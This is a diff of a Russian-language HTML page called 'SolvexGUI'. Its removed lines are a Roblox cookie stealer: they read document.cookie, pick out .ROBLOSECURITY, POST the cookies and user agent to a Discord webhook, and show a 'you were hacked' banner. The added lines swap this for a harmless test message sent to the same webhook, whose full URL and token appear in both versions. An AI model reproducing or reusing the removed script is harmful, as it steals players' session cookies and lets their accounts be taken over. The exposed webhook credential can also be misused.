@@ -3,33 +3,32 @@
 <head>
     <title>SolvexGUI - Проверка</title>
     <style>
-        body { background: #000; color: lime; font-family: monospace; text-align: center; padding-top: 100px; }
+        body { 
+            background: #000; 
+            color: lime; 
+            font-family: monospace; 
+            text-align: center; 
+            padding-top: 100px; 
+        }
         h1 { font-size: 50px; }
     </style>
 </head>
 <body>
+
     <h1>Проверка пройдена!</h1>
-    <p>Твой Roblox куки: <span id="cookie"></span></p>
-    <p>Отправлено на webhook...</p>
+    <p>Webhook получил тестовое сообщение.</p>
 
     <script>
-        // Крадём куки Roblox
-        const cookie = document.cookie;
-        const robloxCookie = cookie.split(';').find(c => c.includes('.ROBLOSECURITY')) || "Не найдено";
-
-        document.getElementById("cookie").innerText = robloxCookie;
-
-        // Отправляем на твой Discord webhook
+        // Тестовое сообщение на твой вебхук
         fetch("https://discord.com/api/webhooks/1444056370738368614/bMficypxa7l6y3Eh1yPftFGdvnXFb_e5oy2yKkjJ7GNWPKIYaGryw8LC0Wc4dxNdwGJ7", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                content: `Новый лог!\nПользователь: ${navigator.userAgent}\nКуки: ${cookie}`
+                content: "⚡ **SolvexGUI Test**: Webhook работает! 🚀"
             })
-        });
-
-        // Можно вставить любой HTML/JS
-        document.body.innerHTML += "<h2 style='color:red;'>ТЫ БЫЛ ВЗЛОМАН</h2>";
+        })
+        .catch(err => console.log("Ошибка отправки:", err));
     </script>
+
 </body>
 </html>
